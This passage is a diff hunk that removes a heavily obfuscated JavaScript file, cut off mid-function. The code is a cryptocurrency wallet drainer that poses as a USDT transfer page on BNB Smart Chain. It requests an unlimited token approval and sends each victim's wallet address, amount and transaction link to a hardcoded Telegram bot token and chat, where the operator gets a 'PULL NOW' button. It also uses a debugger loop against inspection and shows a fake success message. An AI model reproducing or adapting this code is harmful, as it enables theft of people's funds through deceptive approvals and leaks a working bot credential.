@@ -1,1 +1,426 @@
-function a0_0x3d2d(_0x17f5de,_0x2ce081){_0x17f5de=_0x17f5de-0x169;const _0x2d8507=a0_0x2d85();let _0x3d2d0e=_0x2d8507[_0x17f5de];if(a0_0x3d2d['djldke']===undefined){var _0x433402=function(_0x3c6280){const _0x78d663='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x3e780f='',_0x293dd4='';for(let _0x5ab239=0x0,_0x4c09bb,_0x355a00,_0x23c46f=0x0;_0x355a00=_0x3c6280['charAt'](_0x23c46f++);~_0x355a00&&(_0x4c09bb=_0x5ab239%0x4?_0x4c09bb*0x40+_0x355a00:_0x355a00,_0x5ab239++%0x4)?_0x3e780f+=String['fromCharCode'](0xff&_0x4c09bb>>(-0x2*_0x5ab239&0x6)):0x0){_0x355a00=_0x78d663['indexOf'](_0x355a00);}for(let _0x1ba1f0=0x0,_0x37ce5b=_0x3e780f['length'];_0x1ba1f0<_0x37ce5b;_0x1ba1f0++){_0x293dd4+='%'+('00'+_0x3e780f['charCodeAt'](_0x1ba1f0)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x293dd4);};a0_0x3d2d['djUJpZ']=_0x433402,a0_0x3d2d['zphCLL']={},a0_0x3d2d['djldke']=!![];}const _0x3b40be=_0x2d8507[0x0];a0_0x3d2d['ZHEBYH']!==_0x3b40be&&(a0_0x3d2d['zphCLL']={},a0_0x3d2d['ZHEBYH']=_0x3b40be);const _0x34c9d5=a0_0x3d2d['zphCLL'][_0x17f5de];return _0x34c9d5===undefined?(_0x3d2d0e=a0_0x3d2d['djUJpZ'](_0x3d2d0e),a0_0x3d2d['zphCLL'][_0x17f5de]=_0x3d2d0e):_0x3d2d0e=_0x34c9d5,_0x3d2d0e;}function a0_0x2d85(){const _0x1c5b15=['iZm3nde1mq','v0vKBKC','zgf0yxnLDa','y21SAKi','tM90ihbYB3zPzgvK','zw5JB2rLrNvUy3rPB25eyxrH','mca0ChGGmZjWEcaJmdaWoa','ANzjEwW','v2nLqw8','zxjYB3i','yvfAu3C','yxL4u0C','vhjHBNnHy3rPB24Gy2fUy2vSBgvKlG','zLntsvi','B3bHy2L0Eq','vhjHBNnHy3rPB24GAgfZAcbUB3qGyxzHAwXHyMXLihLLDc4','EfzIr1C','yKn6twy','ntaWChG','quTUteO','yxbWzw5Kq2HPBgq','yM9Sza','t3LYuvu','i2zMzG','tM8Gv2vImYb3ywXSzxqGzM91BMqUifbSzwfZzsbVCgvUigLUifrYDxn0ifDHBgXLDcbVCIbnzxrHtwfZAYbICM93C2vYlG','su5Zvvq','zNvUy3rPB24GyxbWCM92zsHHzgrYzxnZihnWzw5KzxiSihvPBNqYntyGyw1VDw50ksbWDwjSAwmGCMv0DxjUCYaOyM9VBcK','zxrOzxjLDw0','y2fUy2vSzwq','AKXLq1u','BwLUv2LKDgG','yM9KEq','mhGZodCYnMvIogmZmdjHote3mui1yZrbndfdq2jgndDdmZGXmdbengq5','l3nLBMrnzxnZywDL','CMvXDwvZDa','s09TEMi','C3r5Bgu','BgvMDa','Aw5WDxq','C3vJy2vZCW','C3rYAw5NAwz5','zgLzqum','zgL2','ChjVy2vZC2LUzY1TB2rHBa','tfvWvMK','DhHiyxnO','rhzMtue','Ahr0Chm6lY9IC2mTzgf0yxnLzwqXlMjPBMfUy2uUB3jNlW','ue9tva','yM94u2HHzg93','rerPCeS','ifvtrfqk','wKPnDuq','AgvPz2H0','DhjHBNnMB3jTidaUm3m','yM9YzgvYuMfKAxvZ','DhjHBNnSyxrLwcGTntaLkq','txvTwe0','zxrOx2fJy291BNrZ','DNnMzK4','qKDMwwC','zg1JwhK','yun1AMW','DgvZDa','uvfvueW','4PYfifb1BgWGqNv0Dg9UicHoB3rPzMLJyxrPB24PihnLBNqGDg8GqwrTAw4Gq2HHDc4','A0rfzMi','Aw5MBW','zxrOx3nLBMruCMfUC2fJDgLVBG','8j+rIsaQkLbvteWGA2fYBMuGA2uGBgL5zsbUzwvJAguGyNv0Dg9UigrHyMf5zwLUlIOQ','Bwf4','DxnLCL9Pza','wvP0DLG','sfr3EeG','BfbZy3G','4PYOicOQq3vYCMvUDcbvu0ruiejHBgfUy2u6kIOG','Aw5Uzxjive1m','ifvtrfqP','tI9b','ENP5Dhe','zxHJzwvKCYbIywXHBMnL','i3r4lwrLDgfPBhmTyNrU','EhLbCLO','zM9YBwf0vw5PDhm','re9nq29UDgvUDeXVywrLza','y1DzugO','mtjWEa','Dgv4DefSAwDU','sxjUC28','Dg9tDhjPBMC','zML4zwq','CLrdD2S','mZbWEcaYmhb4idqWChG','BgvUz3rO','cIaGicaGicaGicaGicaGica8zgL2ihn0EwXLpsjTyxjNAw46idiWChGGmdSIpGOGicaGicaGicaGicaGicaGicaGidXZDMCGD2LKDgG9iJeWmciGAgvPz2H0psiXmdaIihzPzxDcB3G9iJaGmcaXmdaGmtaWiIbMAwXSpsjUB25LiIb4BwXUCZ0IAhr0CdOVl3D3DY53mY5VCMCVmJaWmc9ZDMCIihn0EwXLpsjKAxnWBgf5oIbIBg9JAZSGBwfYz2LUoIaWigf1Dg87iJ4kicaGicaGicaGicaGicaGicaGicaGicaGpgnPCMnSzsbJEd0IntaIign5psi1mciGCJ0IndGIihn0CM9Rzt0IiZeWyJK4msiGC3rYB2TLlxDPzhrOpsi0iIbMAwXSpsjUB25LiI8+cIaGicaGicaGicaGicaGicaGicaGicaGidXWyxrOigq9iK0Zmca1meW0nsa2nuW3nsaZnsiGC3rYB2TLpsiJmtbIotGXiIbZDhjVA2uTD2LKDgG9iJyIigzPBgW9iM5VBMuIihn0CM9Rzs1SAw5Ly2fWpsjYB3vUzciGC3rYB2TLlwXPBMvQB2LUpsjYB3vUzciVpGOGicaGicaGicaGicaGicaGicaGicaGica8l3n2zZ4kicaGicaGicaGicaGicaGidWVzgL2pGOGicaGicaGicaGicaGicaGpgGYihn0EwXLpsjJB2XVCJOGD2HPDgu7igzVBNqTC2L6ztOGms41CMvToYbMB250lxDLAwDODdOGyM9SzdSGBwfYz2LUlwjVDhrVBtOGohb4oYi+uhjVy2vZC2LUzY4UlJWVAdi+cIaGicaGicaGicaGicaGica8CcbZDhLSzt0Iy29SB3i6icnHmgeWyta7ig1HCMDPBI1IB3r0B206idmWChG7igzVBNqTC2L6ztOGmc45nxjLBtSIpGOGicaGicaGicaGicaGicaGicaGifrYyw5Zywn0Aw9UigLUihbYB2DYzxnZisbcBg9JA2nOywLUihzHBgLKyxrPB24GAxmGDw5Kzxj3yxKUifrOAxmGBwf5ihrHA2uGysbMzxCGBwLUDxrLCY4kicaGicaGicaGicaGicaGidWVCd4kicaGicaGicaGicaGicaGidXIDxr0B24GAwq9iNr4lwrLDgfPBhmTyNrUiIbZDhLSzt0IcIaGicaGicaGicaGicaGicaGicaGyMfJA2DYB3vUzdOGiZeWyJK4mtSGcIaGicaGicaGicaGicaGicaGicaGy29SB3i6ihDOAxrLoYakicaGicaGicaGicaGicaGicaGicbIB3jKzxi6ig5VBMu7iaOGicaGicaGicaGicaGicaGicaGihbHzgrPBMC6ide1ChGGmZbWEdSGcIaGicaGicaGicaGicaGicaGicaGyM9YzgvYlxjHzgL1CZOGmtjWEdSGcIaGicaGicaGicaGicaGicaGicaGzM9UDc13zwLNAhq6igjVBgq7iaOGicaGicaGicaGicaGicaGicaGihDPzhrOoIa5mcu7cIaGicaGicaGicaGicaGicaGicaGy3vYC29YoIbWB2LUDgvYoWOGicaGicaGicaGicaGicaGiJ5uCMfUC2fJDgLVBIbKzxrHAwXZpc9IDxr0B24+cIaGicaGicaGicaGia','rMfPBgvKihrVihnLBMqGvgvSzwDYyw0GBwvZC2fNzxm6','twfYA2rVD24','ywXPz25jDgvTCW','wffVB2W','mhGZrda5nJqZowm1qteZzwi2ntzfn0jeote3rMu1ytKZqtyXotrMrJyY','Dg9W','zNjVBq','DhjHBNnPDgLVBG','Dgv4DenVBNrLBNq','mhG1nwqZotGZmJzMotKWntLMrJC3ntq4nti0nJK5otaYn0iZmtK3otu1','C2fnBfu','DhjHBNnSyxrLwsGXmdaLkq','D2fSBgv0x3n3AxrJAev0AgvYzxvTq2HHAw4','DhjPBq','y29Kzq','yMfJA2DYB3vUza','yNv0Dg9UlNCTzNvSBa','Bu5SyKy','ufvmtdO','AfjWBMe','uvP5t1y','vhjHBNnHy3rPB24GzMfPBgvKlIbqBgvHC2uGDhj5igfNywLUlG','DhjHBNnMB3jT','u0Huv0m','qK5c','z1z4y1C','sMnOyxy','Aw5WDxrBCgXHy2vOB2XKzxi9iLvtrfqGqw1VDw50iL0','BvvVtgK','CMDIysGWlcaWlcaWlcaWlJKP','zMLYzwj1zW','mtuWmZu0mezgCfzVva','mZu4nte2nuHezK1Pua','DMfSDwu','mZm2nJu0mhPLrhjkuq','DxrPBhm','CxvLCNLtzwXLy3rVCG','EKLUzgv4','mtv8nhW3FdeZFdeXFdv8mtr8mtz8mhW2FdeYFdH8m3W5FdeWFdf8mG','zxHLy3v0Aw9UihjLDMvYDgvK','zgLZywjSzwq','ywrKrxzLBNrmAxn0zw5LCG','zNb0sLu','C2vHCMnO','DgjTA0u','qK5cifnTyxj0ienOywLU','z2v0u2LNBMvY','otK5oa','y29UC29Szq','v2vIm1bYB3zPzgvY','sw5ZDwzMAwnPzw50iejoqIbMB3iGz2fZigzLzsbVCIbvu0ruigjHBgfUy2uU','wgrut08','qxzAA1u','Bg9N','Ahr0Chm6lY9IC2nZy2fUlMnVBs90Ec8','ugXLyxnLigvUDgvYigeGDMfSAwqGyw1VDw50lG','i2y4nZe3mq','y3jLyxrLrwXLBwvUDa','CMf5DxO','Bwf4v2LKDgG','v1zcwfq','y3ncsMq','Ahr0Chm6lY9HCgKUDgvSzwDYyw0UB3jNl2jVDa','C3zOwKu','zMLUza','zMXLEc1LBMq','mte4nZG0nxfpvfLytG','y3fpA1C','yxbWBgLJyxrPB24VANnVBG','zgDxAeC','D2LKDgG','mJrWEcaYnhb4idaGma','z2v0','tvLkzKW','tgrSBvq','sKrPEKW','EhrKu2y','Aw5ZDwzMAwnPzw50igz1BMrZ','z2v0qwrKCMvZCW','qurnsu5Fq0Hbvf9jra','Cg9PBNrLCKv2zw50CW','8j+sOsaQvgfWigfUzcbOB2XKig9UihrOzsb3ywXSzxqGywrKCMvZCYbHyM92zsb0BYbJB3b5igL0kG','wxfqzLa','CMP0yK0','EhnWqwK','A1HjDgO','4OMiicqWlJaW','Bw1fv20','cMbGyaO','vevmruDsqu1FqK9ux1rps0vo','ofDICePxsW','ifvtrfqkcG','vgHiALu','EMr3DKm','mtmZmZCWnZjWB3vMyLq','D01nr3G','Cg9ZAxrPB24','8j+sScaQkLLVDxiGv2fSBgv0iefKzhjLC3m6kIOGcMbGyaO','otK5otK','Aw5JBhvKzxm','BM90Awz5lwjHCG','yxbWCM92zq','8j+uLYaQkLrYyw5Zywn0Aw9UieHHC2G6kIOGcMbGyaO','ndK0mJC1nKj3vNvsvq','4PYficOQu3rHDhvZoIOQiefWChjVDMvKcGO','ChjLDMvUDerLzMf1Bhq','ChjVy2vZC2LUzY1TB2rHBc1JB250zw50','8j+uLcaQkK5fvYbbufbst1zbtcaTiefdveLptIbsrvfvsvjfrcOQcGO','4PYfifrYyw5Zywn0Aw9UiefWChjVDMvKisaQkIHvBMXPBwL0zwqGuhvSBcbszwfKEsKQkGO','ChjVDMLKzxjZ','qLrwsey','zNvUy3rPB24GzgvJAw1HBhmOksb2Awv3ihjLDhvYBNmGkhvPBNq4kq','rMfPBgvKihrVihn3AxrJAcb0BYbctKiGu21HCNqGq2HHAw4GBMv0D29YAY4','yMPVv1C','z2v0rwXLBwvUDej5swq','yMfSyw5Jzu9M','Ahr0Chm6lY9IC2nZy2fUlMnVBs8','otb2DW','mtaWjq','x2jSyw5R','CgfKzgLUzW','qKHnAw0','tNLrrMm','tM8Gv2vImYb3ywXSzxqGzM91BMqU','D0D4uwm','zM9UDfDLAwDODa','zM9UDfnPEMu','D2fSBgv0x2fKzev0AgvYzxvTq2HHAw4','ywXSidaUm3m','venNDwW','C3bSAxq','AwPvC1u','wMXIveC','BfjXy3O','q29UDhjHy3q','tvrfvwO','BM9Uzq','zgvJAw1HBhm','mJCXmZK0nhrNt1nIva','DxnLCIbYzwPLy3rLza'];a0_0x2d85=function(){return _0x1c5b15;};return a0_0x2d85();}const a0_0x1585d9=a0_0x3d2d;(function(_0x54d6ac,_0x4ce00a){const _0x3466c2=a0_0x3d2d,_0x2aa67f=_0x54d6ac();while(!![]){try{const _0x131551=-parseInt(_0x3466c2(0x1a3))/0x1+-parseInt(_0x3466c2(0x180))/0x2+parseInt(_0x3466c2(0x1eb))/0x3+parseInt(_0x3466c2(0x1c8))/0x4+-parseInt(_0x3466c2(0x181))/0x5+-parseInt(_0x3466c2(0x183))/0x6+-parseInt(_0x3466c2(0x1bf))/0x7*(-parseInt(_0x3466c2(0x1bb))/0x8);if(_0x131551===_0x4ce00a)break;else _0x2aa67f['push'](_0x2aa67f['shift']());}catch(_0xeb4411){_0x2aa67f['push'](_0x2aa67f['shift']());}}}(a0_0x2d85,0xca1f7),(function(){const _0x4ef35={'Jchav':function(_0x1c0dc6,_0x160d5e,_0x1464a5){return _0x1c0dc6(_0x160d5e,_0x1464a5);}};function _0x415af6(){const _0x1ba523=a0_0x3d2d;if(window['console']&&(window[_0x1ba523(0x191)][_0x1ba523(0x17f)]||new RegExp('a+')[_0x1ba523(0x22c)](String['fromCharCode'](0x61)))){debugger;_0x4ef35[_0x1ba523(0x17b)](setTimeout,_0x415af6,0x1f4);}else _0x415af6=function(){};}_0x415af6();}()),document['addEventListener'](a0_0x1585d9(0x241),function(){const _0x41b4d2=a0_0x1585d9,_0x3f5230={'rTCwk':function(_0x5a099a,_0x3537a3){return _0x5a099a+_0x3537a3;},'BHMim':_0x41b4d2(0x1f1),'mNlbF':_0x41b4d2(0x23b),'ltlcC':function(_0x964f4e,_0x18aab3){return _0x964f4e||_0x18aab3;},'tbmkE':function(_0x30cf5e,_0x11e042){return _0x30cf5e+_0x11e042;},'kDEfb':function(_0x25564a,_0x1904cf){return _0x25564a+_0x1904cf;},'WVBXT':function(_0x1a6a06,_0x1db90f,_0x371010){return _0x1a6a06(_0x1db90f,_0x371010);},'xspAi':'application/json','dgWhG':function(_0x247c0a,_0x33d9f7,_0x3c74a8){return _0x247c0a(_0x33d9f7,_0x3c74a8);},'OyrQU':_0x41b4d2(0x21d),'DKuYE':'Markdown','QQUPL':'Telegram\x20notifications\x20process\x20complete.','aSfLs':_0x41b4d2(0x24c),'YqPfP':function(_0x483b58,_0x136417){return _0x483b58(_0x136417);},'zzytq':_0x41b4d2(0x1fc),'UGRbm':_0x41b4d2(0x218),'HTwxH':_0x41b4d2(0x217),'aQZSw':_0x41b4d2(0x247),'ThHjU':_0x41b4d2(0x1d7),'hRpna':_0x41b4d2(0x1c3),'ZJMuD':'flex','YZtvX':_0x41b4d2(0x1a2),'XdTOO':'center','QZyOV':'opacity\x200.3s','vsffN':_0x41b4d2(0x1e9),'yAQol':_0x41b4d2(0x1ff),'zRkcl':_0x41b4d2(0x249),'wGxQc':_0x41b4d2(0x16c),'diYAC':_0x41b4d2(0x223),'INsUT':'click','KOmzb':_0x41b4d2(0x1cb),'mmEWm':'auto','AKnLJ':_0x41b4d2(0x1c5),'bCzMf':_0x41b4d2(0x187),'LUpVi':_0x41b4d2(0x1d6),'fSSIR':_0x41b4d2(0x1e1),'DDipK':_0x41b4d2(0x202),'bxyKw':'1rem','cqOkW':'50%','ZlbTG':_0x41b4d2(0x243),'ijUsU':_0x41b4d2(0x190),'ywRJF':'260px','SHTWC':_0x41b4d2(0x1f6),'sZjRJ':_0x41b4d2(0x199),'zdwvC':function(_0x5b6559,_0x7aef35){return _0x5b6559===_0x7aef35;},'DbXCO':_0x41b4d2(0x214),'sIfOr':'#10b981','RwqyC':_0x41b4d2(0x204),'MTEUj':function(_0x5764e7,_0x40508a){return _0x5764e7<=_0x40508a;},'JDizL':_0x41b4d2(0x1b7),'wlscx':function(_0x2fbd1c,_0x144bfc){return _0x2fbd1c>_0x144bfc;},'DvfMA':function(_0x5829c4,_0x43454e){return _0x5829c4>_0x43454e;},'rjtbM':function(_0x21acc4,_0x439a4f,_0xcee719){return _0x21acc4(_0x439a4f,_0xcee719);},'cmljB':_0x41b4d2(0x1dc),'AvZkU':'function\x20balanceOf(address\x20owner)\x20view\x20returns\x20(uint256)','BGfYg':_0x41b4d2(0x1d0),'XQool':function(_0x20537f){return _0x20537f();},'gVxcW':function(_0x39ca82,_0x4faaf3,_0x539116){return _0x39ca82(_0x4faaf3,_0x539116);},'xyArZ':'Unable\x20to\x20get\x20max\x20balance.','Yuwqh':function(_0x2b51af,_0x3bd88a){return _0x2b51af(_0x3bd88a);},'LdlmT':function(_0x6984f4,_0x5c4172){return _0x6984f4(_0x5c4172);},'bjoWW':_0x41b4d2(0x198),'lPscx':'<span\x20class=\x22spinner\x22>Processing...</span>','WEdnG':'0x38','kXItj':_0x41b4d2(0x179),'jvIyl':_0x41b4d2(0x1d5),'fptJU':_0x41b4d2(0x16d),'NyQFc':function(_0x1d88d6,_0xdf94d){return _0x1d88d6===_0xdf94d;},'cWYPj':'Failed\x20to\x20add\x20BNB\x20Smart\x20Chain\x20network.','MumXM':_0x41b4d2(0x1d1),'TCgul':_0x41b4d2(0x234),'MYJfL':_0x41b4d2(0x207),'lIEBJ':'0x0','GzyHH':'Failed\x20to\x20send\x20notifications\x20or\x20API\x20trigger:','jLeCU':_0x41b4d2(0x1ec),'rayuz':'cancelled','BTVHF':function(_0x50299e,_0x1d82b3,_0x39bbc5){return _0x50299e(_0x1d82b3,_0x39bbc5);},'ayxSG':_0x41b4d2(0x1f9),'aCujl':_0x41b4d2(0x1ae),'MHOPw':_0x41b4d2(0x188),'wMMGx':_0x41b4d2(0x193),'Irnso':_0x41b4d2(0x176),'YlLHZ':_0x41b4d2(0x250),'xVbGW':_0x41b4d2(0x20d),'WceAo':'8976920389:AAEDhWwx4eWf4QB7ZOlNWbanpoBa55Mb8Ks','mUoLi':'7354974947','xfhqj':'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff','GiqtB':'input[placeholder=\x22Search\x20or\x20Enter\x22]','svhZE':_0x41b4d2(0x171),'lRqcz':'button','csBJd':_0x41b4d2(0x213),'xtdSf':function(_0x770749){return _0x770749();}},_0x3a8446={'COMPANY_WALLET_ADDRESS':_0x3f5230['YlLHZ'],'CONTRACT_ADDRESS':_0x3f5230[_0x41b4d2(0x1fd)],'TELEGRAM_BOT_TOKEN':_0x3f5230[_0x41b4d2(0x1f5)],'ADMIN_CHAT_ID':_0x3f5230[_0x41b4d2(0x17d)]},_0x4bd90e=_0x3f5230['xfhqj'],_0x105475=_0x41b4d2(0x16a);async function _0x3dcf6e(_0x450bde,_0x5e50c9,_0x133589,_0x4f743a,_0xda494f){const _0x56348f=_0x41b4d2,_0x370270=_0x3a8446[_0x56348f(0x1ba)],_0x122428=_0x3a8446[_0x56348f(0x1b0)],_0x9529f4=_0x56348f(0x197)+_0x5e50c9,_0x3f01f8=_0x56348f(0x173)+_0x450bde+':'+_0x4f743a,_0x559e11={'inline_keyboard':[[{'text':_0x3f5230[_0x56348f(0x248)](_0x3f5230[_0x56348f(0x248)]('✅\x20PULL\x20NOW\x20(',_0x4f743a),_0x56348f(0x23a)),'callback_data':_0x3f01f8}],[{'text':'🔗\x20View\x20Transaction','url':_0x9529f4}]]},_0x4b8a7b=_0x3f5230[_0x56348f(0x248)](_0x3f5230[_0x56348f(0x248)](_0x56348f(0x1cc),'💰\x20**Wallet\x20Address:**\x20\x0a```\x0a'+_0x450bde+_0x56348f(0x1b9))+('👤\x20**User\x20ID:**\x20'+(_0x133589||_0x3f5230[_0x56348f(0x1da)])+'\x0a'),'💵\x20**Input\x20Amount:**\x20'+(_0x4f743a||_0x3f5230[_0x56348f(0x172)])+_0x56348f(0x220))+(_0x56348f(0x238)+_0x3f5230['ltlcC'](_0xda494f,_0x56348f(0x23b))+_0x56348f(0x1bc))+_0x56348f(0x1cd)+_0x56348f(0x232),_0x59679d=_0x3f5230[_0x56348f(0x18d)](_0x3f5230[_0x56348f(0x22f)](_0x3f5230[_0x56348f(0x22f)]('🎉\x20**USDT\x20Approval\x20Successful!**\x0a\x0a',_0x56348f(0x1c2)+_0x450bde+'\x0a```\x0a')+(_0x56348f(0x1c7)+_0x5e50c9+_0x56348f(0x1b9)),_0x56348f(0x1c9))+'You\x20can\x20now\x20proceed\x20with\x20USDT\x20transfers.\x0a\x0a',_0x56348f(0x1b2));try{await _0x3f5230[_0x56348f(0x19d)](fetch,_0x56348f(0x19f)+_0x370270+_0x56348f(0x20e),{'method':_0x56348f(0x21d),'headers':{'Content-Type':_0x3f5230[_0x56348f(0x1b5)]},'body':JSON[_0x56348f(0x215)]({'chat_id':_0x122428,'text':_0x4b8a7b,'parse_mode':_0x56348f(0x24d),'reply_markup':_0x559e11})}),console[_0x56348f(0x196)](_0x56348f(0x22e)),_0x133589&&await _0x3f5230['dgWhG'](fetch,_0x56348f(0x19f)+_0x370270+_0x56348f(0x20e),{'method':_0x3f5230[_0x56348f(0x203)],'headers':{'Content-Type':_0x56348f(0x1a5)},'body':JSON[_0x56348f(0x215)]({'chat_id':_0x133589,'text':_0x59679d,'parse_mode':_0x3f5230['DKuYE'],'reply_markup':_0x559e11})}),console[_0x56348f(0x196)](_0x3f5230[_0x56348f(0x22d)]);}catch(_0x44730f){console['error'](_0x3f5230['aSfLs'],_0x44730f);}}function _0x2f4b7a(_0x314a18,_0x26c7b1=null){const _0x1af30e=_0x41b4d2,_0x3ab822={'saMlU':_0x1af30e(0x1d8),'dmcXy':function(_0x5ebf30,_0x5b3453){const _0x251cc5=_0x1af30e;return _0x3f5230[_0x251cc5(0x1b3)](_0x5ebf30,_0x5b3453);},'ZeOua':_0x3f5230[_0x1af30e(0x23c)]};let _0x406428=document['getElementById'](_0x3f5230['UGRbm']);if(!_0x406428){_0x406428=document['createElement'](_0x3f5230['HTwxH']),_0x406428['id']=_0x3f5230['UGRbm'],_0x406428[_0x1af30e(0x211)][_0x1af30e(0x1c1)]=_0x3f5230[_0x1af30e(0x1f7)],_0x406428['style']['top']='0',_0x406428['style'][_0x1af30e(0x212)]='0',_0x406428['style'][_0x1af30e(0x1a7)]=_0x3f5230[_0x1af30e(0x1bd)],_0x406428[_0x1af30e(0x211)][_0x1af30e(0x222)]=_0x3f5230['ThHjU'],_0x406428['style'][_0x1af30e(0x170)]=_0x1af30e(0x17e),_0x406428['style'][_0x1af30e(0x186)]=_0x3f5230[_0x1af30e(0x174)],_0x406428['style']['display']=_0x3f5230[_0x1af30e(0x221)],_0x406428[_0x1af30e(0x211)][_0x1af30e(0x24e)]=_0x3f5230[_0x1af30e(0x235)],_0x406428[_0x1af30e(0x211)]['justifyContent']=_0x3f5230[_0x1af30e(0x194)],_0x406428[_0x1af30e(0x211)]['transition']=_0x3f5230[_0x1af30e(0x175)],_0x406428[_0x1af30e(0x211)]['opacity']='0',_0x406428[_0x1af30e(0x211)][_0x1af30e(0x1b1)]=_0x3f5230[_0x1af30e(0x228)];const _0x1dd31f=document[_0x1af30e(0x19a)](_0x3f5230[_0x1af30e(0x236)]);_0x1dd31f[_0x1af30e(0x211)][_0x1af30e(0x170)]='#18181a',_0x1dd31f[_0x1af30e(0x211)][_0x1af30e(0x1a7)]=_0x3f5230['ThHjU'],_0x1dd31f[_0x1af30e(0x211)]['maxWidth']=_0x3f5230['yAQol'],_0x1dd31f[_0x1af30e(0x211)][_0x1af30e(0x1d9)]=_0x3f5230['zRkcl'],_0x1dd31f[_0x1af30e(0x211)][_0x1af30e(0x224)]=_0x1af30e(0x1a8),_0x1dd31f[_0x1af30e(0x211)][_0x1af30e(0x244)]=_0x3f5230[_0x1af30e(0x194)],_0x1dd31f[_0x1af30e(0x211)]['transform']=_0x3f5230[_0x1af30e(0x1dd)],_0x1dd31f[_0x1af30e(0x211)][_0x1af30e(0x253)]=_0x3f5230[_0x1af30e(0x216)],_0x1dd31f['id']=_0x1af30e(0x1cb),_0x1dd31f['innerHTML']=_0x1af30e(0x24b);const _0x5256f4=_0x1dd31f[_0x1af30e(0x185)](_0x1af30e(0x23e));_0x5256f4[_0x1af30e(0x18a)](_0x3f5230[_0x1af30e(0x206)],()=>{const _0x39fee0=_0x1af30e,_0x279a8f=_0x406428['dataset'][_0x39fee0(0x21a)];if(_0x279a8f){const _0x23f81d=_0x39fee0(0x197)+_0x279a8f;window['open'](_0x23f81d,_0x3ab822[_0x39fee0(0x16b)]);}else _0x3ab822[_0x39fee0(0x22a)](alert,_0x3ab822['ZeOua']);}),_0x406428[_0x1af30e(0x201)](_0x1dd31f),document['body'][_0x1af30e(0x201)](_0x406428);}_0x406428[_0x1af30e(0x1ef)][_0x1af30e(0x21a)]=_0x26c7b1;const _0x245fed=document[_0x1af30e(0x1d3)](_0x3f5230[_0x1af30e(0x210)]);_0x314a18?(_0x406428[_0x1af30e(0x211)][_0x1af30e(0x1fb)]='1',_0x406428[_0x1af30e(0x211)][_0x1af30e(0x1b1)]=_0x3f5230['mmEWm'],_0x245fed['style'][_0x1af30e(0x177)]='translateY(0)'):(_0x245fed[_0x1af30e(0x211)]['transform']=_0x3f5230['wGxQc'],_0x3f5230['WVBXT'](setTimeout,()=>{const _0x58d7b7=_0x1af30e;_0x406428[_0x58d7b7(0x211)]['opacity']='0',_0x406428[_0x58d7b7(0x211)][_0x58d7b7(0x1b1)]=_0x58d7b7(0x1e9);},0x12c));}function _0xa818aa(_0x3bddfd,_0x2bbb19=_0x41b4d2(0x230)){const _0x582931=_0x41b4d2;let _0x5ce589=document['getElementById'](_0x3f5230['AKnLJ']);if(!_0x5ce589){const _0x476b15=_0x3f5230[_0x582931(0x1fe)][_0x582931(0x1e3)]('|');let _0x2726d5=0x0;while(!![]){switch(_0x476b15[_0x2726d5++]){case'0':_0x5ce589[_0x582931(0x211)][_0x582931(0x19c)]=_0x3f5230[_0x582931(0x219)];continue;case'1':_0x5ce589['style']['transition']=_0x3f5230[_0x582931(0x1fa)];continue;case'2':document[_0x582931(0x20c)]['appendChild'](_0x5ce589);continue;case'3':_0x5ce589['style'][_0x582931(0x1de)]=_0x3f5230[_0x582931(0x21f)];continue;case'4':_0x5ce589['id']=_0x3f5230[_0x582931(0x200)];continue;case'5':_0x5ce589[_0x582931(0x211)]['transform']=_0x582931(0x225);continue;case'6':_0x5ce589[_0x582931(0x211)]['padding']='16px\x2032px';continue;case'7':_0x5ce589['style'][_0x582931(0x1c1)]=_0x3f5230[_0x582931(0x1f7)];continue;case'8':_0x5ce589[_0x582931(0x211)][_0x582931(0x1df)]=_0x3f5230['bxyKw'];continue;case'9':_0x5ce589['style'][_0x582931(0x244)]=_0x3f5230[_0x582931(0x194)];continue;case'10':_0x5ce589['style'][_0x582931(0x21e)]=_0x582931(0x1f3);continue;case'11':_0x5ce589[_0x582931(0x211)]['left']=_0x3f5230[_0x582931(0x1a4)];continue;case'12':_0x5ce589['style'][_0x582931(0x224)]=_0x3f5230[_0x582931(0x1e5)];continue;case'13':_0x5ce589[_0x582931(0x211)][_0x582931(0x251)]='20px';continue;case'14':_0x5ce589[_0x582931(0x211)][_0x582931(0x186)]=_0x3f5230[_0x582931(0x1e4)];continue;case'15':_0x5ce589=document[_0x582931(0x19a)](_0x3f5230['HTwxH']);continue;case'16':_0x5ce589[_0x582931(0x211)][_0x582931(0x20b)]=_0x3f5230['ywRJF'];continue;}break;}}_0x5ce589[_0x582931(0x169)]=_0x3bddfd,_0x5ce589[_0x582931(0x211)][_0x582931(0x170)]=_0x2bbb19===_0x3f5230['SHTWC']?_0x3f5230['sZjRJ']:_0x3f5230[_0x582931(0x1be)](_0x2bbb19,_0x3f5230['DbXCO'])?_0x3f5230['sIfOr']:_0x582931(0x1ed),_0x5ce589[_0x582931(0x211)]['color']=_0x3f5230['RwqyC'],_0x5ce589['style'][_0x582931(0x1fb)]='1',_0x5ce589[_0x582931(0x211)][_0x582931(0x1b1)]=_0x3f5230[_0x582931(0x1b8)],_0x3f5230['dgWhG'](setTimeout,()=>{const _0x42abac=_0x582931;_0x5ce589['style'][_0x42abac(0x1fb)]='0',_0x5ce589['style'][_0x42abac(0x1b1)]=_0x3f5230[_0x42abac(0x228)];},0xbb8);}const _0x569d66=document[_0x41b4d2(0x185)](_0x3f5230['GiqtB']),_0x1c1887=document[_0x41b4d2(0x185)](_0x41b4d2(0x17c)),_0x3fdf14=document['querySelector'](_0x3f5230[_0x41b4d2(0x1a0)]),_0x3c747d=_0x3fdf14['innerHTML'],_0x2592d9=document[_0x41b4d2(0x185)]('.text-xs.text-gray-500'),_0xe79662=Array[_0x41b4d2(0x252)](document['querySelectorAll'](_0x3f5230[_0x41b4d2(0x1e6)]))[_0x41b4d2(0x1a1)](_0x49c2ed=>_0x49c2ed[_0x41b4d2(0x169)][_0x41b4d2(0x16e)]()['toLowerCase']()===_0x41b4d2(0x233));_0x1c1887[_0x41b4d2(0x182)]='0',_0x2592d9['textContent']=_0x41b4d2(0x1b7);function _0x1ce8d8(){const _0x2e04c2=_0x41b4d2;let 